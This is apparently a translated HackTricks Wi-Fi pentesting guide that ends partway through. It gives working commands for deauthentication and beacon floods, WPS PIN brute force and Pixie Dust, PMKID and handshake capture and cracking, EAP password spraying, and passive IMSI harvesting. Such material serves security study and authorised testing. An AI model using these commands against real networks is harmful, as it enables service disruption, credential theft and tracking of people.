# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi podstawowe polecenia
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzędzia

### Hijacker & NexMon (Android — wewnętrzne Wi‑Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon przy użyciu Docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Może przeprowadzać ataki Evil Twin, KARMA i Known Beacons, a następnie użyć phishing template, aby uzyskać rzeczywiste hasło do sieci lub przechwycić dane logowania do serwisów społecznościowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzędzie automatyzuje **WPS/WEP/WPA-PSK** attacks. Automatycznie:

- Ustawi interfejs w trybie monitor
- Skanuje możliwe sieci - i pozwala wybrać victim(s)
- Jeśli WEP - Uruchomi WEP attacks
- Jeśli WPA-PSK
- Jeśli WPS: Pixie dust attack i the bruteforce attack (uważaj — the brute-force attack może zająć dużo czasu). Zauważ, że nie próbuje null PIN ani database/generated PINs.
- Próbuje przechwycić PMKID z AP, aby go złamać
- Próbuje zdeautoryzować klientów AP, aby przechwycić handshake
- Jeśli PMKID lub Handshake, próbuje bruteforce używając top5000 passwords.

## Podsumowanie ataków

- **DoS**
- Deauthentication/disassociation -- Rozłączyć wszystkich (lub konkretny ESSID/Client)
- Random fake APs -- Ukrywanie sieci, możliwe zawieszanie skanerów
- Overload AP -- Próba zabić AP (zazwyczaj mało przydatne)
- WIDS -- Manipulacja IDS
- TKIP, EAPOL -- Niektóre specyficzne ataki powodujące DoS niektórych AP
- **Cracking**
- Crack **WEP** (wiele narzędzi i metod)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Przydatne do capture captive portal creds i/lub przeprowadzania LAN attacks
- **WPA-PSK** Evil Twin -- Przydatne do network attacks jeśli znasz hasło
- **WPA-MGT** -- Przydatne do capture company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Przydatne do capture captive portal creds i/lub przeprowadzania LAN attacks
- **+ WPA** -- Przydatne do capture WPA handshakes

## DOS

### Deauthentication Packets

**Opis pochodzi z** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, powszechna metoda w hakowaniu Wi-Fi, polegają na fałszowaniu "management" frames, aby **wymusić rozłączenie urządzeń z sieci**. Te niezaszyfrowane pakiety wprowadzają klientów w błąd, sprawiając, że uwierzą, iż pochodzą z legalnej sieci, co umożliwia atakującym zbieranie WPA handshakes w celach crackingu lub trwałe zakłócanie połączeń sieciowych. Ta taktyka, niepokojąca swoją prostotą, jest szeroko stosowana i ma istotne implikacje dla bezpieczeństwa sieci.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 oznacza deauthentication
- 1 oznacza liczbę deauths do wysłania (możesz wysłać wiele, jeśli chcesz); 0 oznacza wysyłanie ich ciągle
- -a 00:14:6C:7E:40:80 to adres MAC punktu dostępowego
- -c 00:0F:B5:34:30:30 to adres MAC klienta do deauthenticate; jeśli to zostanie pominięte, wysyłana jest broadcast deauthentication (nie zawsze działa)
- ath0 to nazwa interfejsu

### Disassociation Packets

**Disassociation packets**, podobnie jak deauthentication packets, są rodzajem management frame używanym w sieciach Wi‑Fi. Te pakiety służą do przerwania połączenia między urządzeniem (takim jak laptop lub smartfon) a access point (AP). Główna różnica między disassociation a deauthentication leży w scenariuszach ich użycia. Podczas gdy AP emituje **deauthentication packets w celu wyraźnego usunięcia rogue devices z sieci, disassociation packets są zwykle wysyłane, gdy AP przechodzi przez zamknięcie**, ponowne uruchomienie lub przeniesienie, co wymaga rozłączenia wszystkich podłączonych węzłów.

**Ten atak można wykonać za pomocą mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Więcej ataków DOS przez mdk4**

**W** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Wysyła beacon frames, aby pokazać fałszywe APs klientom. To czasami może spowodować zawieszenie network scanners, a nawet drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Wysyłanie ramek uwierzytelniających do wszystkich dostępnych Access Points (APs) w zasięgu może przeciążyć te APs, szczególnie gdy zaangażowanych jest wielu klientów. Ten intensywny ruch może prowadzić do niestabilności systemu, powodując zawieszanie się niektórych APs lub nawet ich reset.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) sprawdza, czy SSID jest poprawnie ujawniony i potwierdza zasięg AP. Ta technika, w połączeniu z **bruteforcing hidden SSIDs** z użyciem lub bez wordlist, pomaga zidentyfikować i uzyskać dostęp do ukrytych sieci.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Wysyłanie losowych lub duplikowanych pakietów do różnych kolejek QoS może wywołać Michael Countermeasures na **TKIP APs**, co skutkuje minutowym wyłączeniem AP. Metoda ta jest efektywną taktyką ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Zalewanie AP **EAPOL Start frames** powoduje tworzenie **fałszywych sesji**, przeciążając AP i blokując uprawnionych klientów. Alternatywnie, wstrzyknięcie **fałszywych EAPOL Logoff messages** wymusza rozłączenie klientów — obie metody skutecznie zakłócają usługę sieciową.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataki na sieci mesh IEEE 802.11s**

Różne ataki na zarządzanie łączami i routing w sieciach mesh.

**ATTACK MODE w: WIDS Confusion**

Krzyżowe podłączanie klientów do wielu węzłów WDS lub fałszywych rogue APs może manipulować Intrusion Detection and Prevention Systems, powodując zamieszanie i potencjalne nadużycia systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**TRYB ATAKU f: Packet Fuzzer**

Packet fuzzer oferujący różnorodne źródła pakietów oraz kompleksowy zestaw modyfikatorów do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje większość ataków opisanych powyżej:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) upraszcza proces łączenia urządzeń z routerem, przyspieszając i ułatwiając konfigurację sieci szyfrowanych za pomocą **WPA** lub **WPA2** Personal. Nie jest skuteczny wobec łatwo złamanego zabezpieczenia **WEP**. WPS wykorzystuje 8‑cyfrowy PIN, weryfikowany w dwóch częściach, co czyni go podatnym na ataki typu brute‑force ze względu na ograniczoną liczbę kombinacji (ok. 11 000 możliwości).

### WPS Bruteforce

Do wykonania tego ataku głównie używa się 2 narzędzi: Reaver i Bully.

- **Reaver** został zaprojektowany jako solidny i praktyczny atak na WPS i był testowany na wielu różnych punktach dostępowych oraz implementacjach WPS.
- **Bully** to **nowa implementacja** ataku brute force na WPS, napisana w C. Ma kilka zalet w porównaniu z oryginalnym kodem reaver: mniej zależności, lepszą wydajność pamięci i CPU, poprawne traktowanie endianness oraz bardziej rozbudowany zestaw opcji.

Atak wykorzystuje podatność **WPS PIN**, w szczególności ujawnienie pierwszych czterech cyfr oraz rolę ostatniej cyfry jako sumy kontrolnej, co ułatwia brute‑force. Jednakże mechanizmy obronne przeciw atakom brute‑force, takie jak **blocking MAC addresses** agresywnych atakujących, wymagają **MAC address rotation**, aby kontynuować atak.

Po uzyskaniu WPS PIN za pomocą narzędzi takich jak Bully lub Reaver, atakujący może wyprowadzić WPA/WPA2 PSK, zapewniając **trwały dostęp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

To dopracowane podejście celuje w WPS PINy, wykorzystując znane podatności:

1. **Pre-discovered PINs**: Korzysta z bazy danych znanych PINów powiązanych z konkretnymi producentami, którzy stosują jednakowe WPS PINy. Ta baza danych koreluje pierwsze trzy oktety MAC-addresses z prawdopodobnymi PINami dla tych producentów.
2. **PIN Generation Algorithms**: Wykorzystuje algorytmy takie jak ComputePIN i EasyBox, które obliczają WPS PINy na podstawie MAC-address AP. Algorytm Arcadyan dodatkowo wymaga device ID, co dodaje kolejną warstwę do procesu generowania PINu.

### WPS Pixie Dust attack

**Dominique Bongard** odkrył wadę w niektórych Access Points (APs) dotyczącą tworzenia tajnych kodów, znanych jako **nonces** (**E-S1** i **E-S2**). Jeśli te nonces można odtworzyć, złamanie WPS PINu AP staje się proste. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodnić, że jest to legalny, a nie fałszywy (rogue) AP. Te nonces są w istocie "kluczami" do otwarcia "sejfu" zawierającego WPS PIN. Więcej na ten temat można znaleźć [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Mówiąc prościej, problem polega na tym, że niektóre APs nie używały wystarczająco losowych kluczy do szyfrowania PINu podczas procesu łączenia. To sprawia, że PIN jest podatny na odgadnięcie z zewnątrz sieci (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeśli nie chcesz przełączać urządzenia w monitor mode, lub `reaver` i `bully` sprawiają problemy, możesz spróbować [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzędzie potrafi przeprowadzić Pixie Dust attack bez konieczności przełączania do monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Niektóre źle zaprojektowane systemy pozwalają, by **Null PIN** (pusty lub nieistniejący PIN) przyznawał dostęp, co jest dość nietypowe. Narzędzie **Reaver** potrafi testować tę podatność, w przeciwieństwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki na WPS można łatwo wykonać za pomocą _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 pozwalają wypróbować **twój własny PIN** (jeśli go masz)
- 7 i 8 wykonują **Pixie Dust attack**
- 13 pozwala przetestować **NULL PIN**
- 11 i 12 **odzyskują PINs związane z wybranym AP z dostępnych baz danych** i **generują** możliwe **PINs** przy użyciu: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, czemu by nie?)
- 9 i 10 przetestują **każdy możliwy PIN**

## **WEP**

Tak bardzo złamany i obecnie nieużywany. Po prostu wiedz, że _**airgeddon**_ ma opcję WEP nazwaną "All-in-One" do atakowania tego typu zabezpieczeń. Więcej narzędzi oferuje podobne opcje.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) nową metodę ataku, wyjątkową ponieważ potrzebuje tylko **jednego pakietu** i nie wymaga, aby jacykolwiek klienci byli podłączeni do docelowego AP — wystarczy interakcja między atakującym a AP.

Wiele nowoczesnych routerów dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas asocjacji, znane jako `Robust Security Network`. Zawiera ono `PMKID`.

Jak wyjaśnia oryginalny post, **PMKID** jest tworzony z użyciem znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Skoro "PMK Name" jest stały, znamy BSSID AP i stacji, a `PMK` jest identyczny z tym z pełnego 4-way handshake, **hashcat** może użyć tych informacji do złamania PSK i odzyskania hasła!

Aby **zebrać** te informacje i lokalnie **bruteforce** hasło możesz zrobić:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** zostaną wyświetlone w **console** i także **zapisane** w \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj przechwycenie na format **hashcat/john** i złam je:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Proszę zauważyć, że format poprawnego hash zawiera **4 części**, np.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Jeśli Twój **tylko** zawiera **3 części**, to jest **nieprawidłowy** (the PMKID capture wasn't valid).

Zauważ, że `hcxdumptool` **also capture handshakes** (pojawi się coś takiego: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Możesz **przekształcić** **handshakes** do formatu **hashcat**/**john** używając `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauważyłem, że niektóre handshakes przechwycone za pomocą tego narzędzia nie dały się cracked, nawet znając poprawne hasło. Zalecam przechwytywanie handshakes także w tradycyjny sposób, jeśli to możliwe, lub przechwycenie kilku z nich przy użyciu tego narzędzia._

### Przechwycenie handshake

Atak na **WPA/WPA2** sieci można przeprowadzić, przechwytując **handshake** i próbując **crack** hasła **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na określonym **channel**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **channel**, i **connected client** docelowej sieci.
2. Użyj `airodump-ng` do monitorowania ruchu sieciowego na określonym **channel** i **BSSID**, mając nadzieję na przechwycenie **handshake**. Polecenie będzie wyglądać tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwiększyć szansę przechwycenia handshake, chwilowo rozłącz klienta z sieci, aby wymusić ponowną autoryzację. Można to zrobić za pomocą polecenia `aireplay-ng`, które wysyła deauthentication packets do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Gdy w `airodump-ng` pojawią się informacje o handshake, oznacza to, że handshake został przechwycony i możesz przestać nasłuchiwać:

![](<../../images/image (172) (1).png>)

Gdy handshake zostanie przechwycony, możesz go **crack** przy użyciu `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawdź, czy plik zawiera handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeśli to narzędzie znajdzie nieukończony handshake dla ESSID przed ukończonym handshake, nie wykryje prawidłowego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **enterprise WiFi setups, napotkasz różne metody uwierzytelniania**, z których każda zapewnia inne poziomy bezpieczeństwa i funkcje zarządzania. Gdy używasz narzędzi takich jak `airodump-ng` do inspekcji ruchu sieciowego, możesz zauważyć identyfikatory tych typów uwierzytelniania. Niektóre powszechne metody to:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ta metoda obsługuje hardware tokens i one-time passwords w ramach EAP-PEAP. W przeciwieństwie do MSCHAPv2 nie używa peer challenge i wysyła hasła w postaci jawnej do access pointa, co stwarza ryzyko ataków typu downgrade.
2. **EAP-MD5 (Message Digest 5)**:
- Polega na wysłaniu z klienta hasha MD5 hasła. Jest **niezalecany** ze względu na podatność na ataki słownikowe, brak uwierzytelniania serwera oraz niemożność wygenerowania kluczy WEP specyficznych dla sesji.
3. **EAP-TLS (Transport Layer Security)**:
- Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania i może dynamicznie generować klucze WEP oparte na użytkowniku i sesji w celu zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Zapewnia wzajemne uwierzytelnianie przez zaszyfrowany tunel oraz metodę wyprowadzenia dynamicznych kluczy WEP dla każdego użytkownika i każdej sesji. Wymaga jedynie certyfikatów po stronie serwera, klienci używają poświadczeń.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Działa podobnie do EAP, tworząc tunel TLS dla chronionej komunikacji. Pozwala na stosowanie słabszych protokołów uwierzytelniania nad EAP dzięki ochronie zapewnianej przez tunel.
- **PEAP-MSCHAPv2**: Często określany po prostu jako PEAP, łączy podatny mechanizm challenge/response MSCHAPv2 z ochronnym tunelem TLS.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Podobny do EAP-TLS, ale inicjuje tunel TLS przed wymianą certyfikatów, oferując dodatkową warstwę zabezpieczeń.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) i [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie nazwy użytkownika

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wygląda na to, że jeśli używasz **EAP** to komunikaty **"Identity"** muszą być **obsługiwane**, a **nazwa użytkownika** będzie wysyłana w **jawnej** formie w komunikatach **"Response Identity"**.

Nawet używając jednej z najbezpieczniejszych metod uwierzytelniania: **PEAP-EAP-TLS**, możliwe jest **przechwycenie nazwy użytkownika wysyłanej w protokole EAP**. Aby to zrobić, **przechwyć komunikację uwierzytelniającą** (uruchom `airodump-ng` na danym kanale i `wireshark` na tym samym interfejsie) i filtruj pakiety po `eapol`.\
Wewnątrz pakietu "**Response, Identity**" pojawi się **nazwa użytkownika** klienta.

![](<../../images/image (850).png>)

### Anonimowe tożsamości

Identity hiding jest wspierane zarówno przez EAP-PEAP, jak i EAP-TTLS. W kontekście sieci WiFi, żądanie EAP-Identity jest zwykle inicjowane przez access point (AP) podczas procesu association. Aby zapewnić ochronę anonimowości użytkownika, odpowiedź klienta EAP na urządzeniu użytkownika zawiera tylko niezbędne informacje wymagane przez początkowy serwer RADIUS do przetworzenia żądania. Koncept ten ilustrują następujące scenariusze:

- EAP-Identity = anonymous
- W tym scenariuszu wszyscy użytkownicy używają pseudonimu "anonymous" jako identyfikatora użytkownika. Początkowy serwer RADIUS działa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za obsługę strony serwera protokołu PEAP lub TTLS. Wewnętrzna (chroniona) metoda uwierzytelniania jest wtedy obsługiwana lokalnie lub delegowana do zdalnego (home) serwera RADIUS.
- EAP-Identity = anonymous@realm_x
- W tej sytuacji użytkownicy z różnych realmów ukrywają swoje tożsamości, jednocześnie wskazując swoje odpowiednie realmy. Pozwala to początkowemu serwerowi RADIUS na proxy'owanie żądań EAP-PEAP lub EAP-TTLS do serwerów RADIUS w ich home realmach, które działają jako serwery PEAP lub TTLS. Początkowy serwer RADIUS działa wyłącznie jako węzeł przekazujący RADIUS.
- Alternatywnie, początkowy serwer RADIUS może funkcjonować jako serwer EAP-PEAP lub EAP-TTLS i albo obsługiwać chronioną metodę uwierzytelniania, albo przekazywać ją do innego serwera. Opcja ta ułatwia konfigurację odrębnych polityk dla różnych realmów.

W EAP-PEAP, gdy tunel TLS zostanie ustanowiony między serwerem PEAP a klientem PEAP, serwer PEAP inicjuje żądanie EAP-Identity i przesyła je przez tunel TLS. Klient odpowiada na to drugie żądanie EAP-Identity wysyłając odpowiedź EAP-Identity zawierającą prawdziwą tożsamość użytkownika przez zaszyfrowany tunel. Podejście to skutecznie zapobiega ujawnieniu rzeczywistej tożsamości użytkownika komukolwiek podsłuchującemu ruch 802.11.

EAP-TTLS stosuje nieco inną procedurę. W EAP-TTLS klient zazwyczaj uwierzytelnia się używając PAP lub CHAP, zabezpieczonych przez tunel TLS. W tym przypadku klient dołącza atrybut User-Name oraz albo atrybut Password albo CHAP-Password w początkowej wiadomości TLS wysyłanej po ustanowieniu tunelu.

Niezależnie od wybranego protokołu, serwer PEAP/TTLS uzyskuje wiedzę o prawdziwej tożsamości użytkownika po ustanowieniu tunelu TLS. Prawdziwa tożsamość może być reprezentowana jako user@realm lub po prostu user. Jeśli serwer PEAP/TTLS jest również odpowiedzialny za uwierzytelnienie użytkownika, posiada teraz jego tożsamość i kontynuuje metodę uwierzytelniania chronioną przez tunel TLS. Alternatywnie, serwer PEAP/TTLS może przekazać nowe żądanie RADIUS do home serwera RADIUS użytkownika. To nowe żądanie RADIUS pomija warstwę protokołu PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewnętrzne wiadomości EAP są przesyłane do home serwera RADIUS bez wrappera EAP-PEAP lub EAP-TTLS. Atrybut User-Name w wychodzącej wiadomości RADIUS zawiera prawdziwą tożsamość użytkownika, zastępując anonimowy User-Name z przychodzącego żądania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsługiwane tylko przez TTLS), User-Name i inne atrybuty uwierzytelniające wyekstrahowane z payloadu TLS są podstawiane w wychodzącej wiadomości RADIUS, wypierając anonimowy User-Name i atrybuty TTLS EAP-Message z przychodzącego żądania RADIUS.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknij, aby rozwinąć</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Uwagi:
- Działa przed jakimkolwiek tunelowaniem TLS, jeśli wdrożenie używa bare EAP‑SIM/AKA bez chronionych identyfikatorów/pseudonimów.
- Ujawniona wartość jest stałym identyfikatorem powiązanym z SIM subskrybenta; zbieranie takich danych umożliwia długoterminowe śledzenie i dalsze nadużycia w telekomunikacji.

Skutki
- Prywatność: trwałe śledzenie użytkownika/urządzenia na podstawie pasywnych przechwyceń Wi‑Fi w miejscach publicznych.
- Uruchomienie nadużyć telekomunikacyjnych: mając IMSI, atakujący z dostępem do SS7/Diameter może ustalić lokalizację lub próbować przechwycić połączenia/SMS oraz wyłudzić MFA.

Środki zaradcze / na co zwrócić uwagę
- Sprawdź, czy klienci używają anonimowych zewnętrznych tożsamości (pseudonimów) dla EAP‑SIM/AKA zgodnie z wytycznymi 3GPP (np. 3GPP TS 33.402).
- Preferuj tunelowanie fazy identyfikacji (np. EAP‑TTLS/PEAP przenoszący wewnętrzne EAP‑SIM/AKA), aby IMSI nigdy nie było wysyłane w postaci jawnej.
- Zrzuty pakietów z association/auth nigdy nie powinny ujawniać surowego IMSI w EAP-Response/Identity.

Powiązane: Eksploatacja sygnalizacji telekomunikacyjnej przy użyciu przechwyconych identyfikatorów mobilnych
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Jeśli klient ma używać **username and password** (uwaga: **EAP-TLS won't be valid** w tym przypadku), możesz spróbować zdobyć **listę** **usernames** (zobacz następny fragment) i **passwords**, a następnie spróbować **bruteforce** dostępu przy użyciu [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Możesz także przeprowadzić ten attack przy użyciu `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria ataków na klienta

### Network Selection and Roaming

- Protokół 802.11 definiuje, jak stacja dołącza do Extended Service Set (ESS), ale nie określa kryteriów wyboru ESS ani access point (AP) w jego obrębie.
- Stacje mogą przemieszczać się między AP udostępniającymi ten sam ESSID, zachowując łączność w obrębie budynku lub obszaru.
- Protokół wymaga uwierzytelnienia stacji do ESS, ale nie nakazuje uwierzytelnienia AP wobec stacji.

### Preferred Network Lists (PNLs)

- Stacje przechowują ESSID każdej sieci bezprzewodowej, z którą się łączą, w swojej liście preferowanych sieci (PNL), wraz ze szczegółami konfiguracji specyficznymi dla danej sieci.
- PNL jest używana do automatycznego łączenia z znanymi sieciami, poprawiając wygodę użytkownika poprzez uproszczenie procesu łączenia.

### Passive Scanning

- AP okresowo nadają beacon frames, ogłaszając swoją obecność i funkcje, w tym ESSID AP, chyba że broadcastowanie jest wyłączone.
- Podczas skanowania pasywnego stacje nasłuchują beacon frames. Jeśli ESSID z beacona pasuje do wpisu w PNL stacji, stacja może automatycznie połączyć się z tym AP.
- Znajomość PNL urządzenia umożliwia potencjalne wykorzystanie przez naśladowanie ESSID znanej sieci, oszukując urządzenie, by połączyło się z rogue AP.

### Active Probing

- Aktywne sondowanie polega na wysyłaniu przez stacje probe requests w celu wykrycia pobliskich AP i ich cech.
- Directed probe requests są skierowane do konkretnego ESSID, co pomaga wykryć, czy dana sieć jest w zasięgu, nawet jeśli jest ukryta.
- Broadcast probe requests mają pole SSID ustawione na null i są wysyłane do wszystkich pobliskich AP, pozwalając stacji sprawdzić dowolną preferowaną sieć bez ujawniania zawartości jej PNL.

## Simple AP with redirection to Internet

Zanim wyjaśnimy, jak przeprowadzać bardziej złożone ataki, zostanie objaśnione **jak** po prostu **utworzyć** **AP** i **przekierować** jego **ruch** na interfejs połączony z **Internetem**.

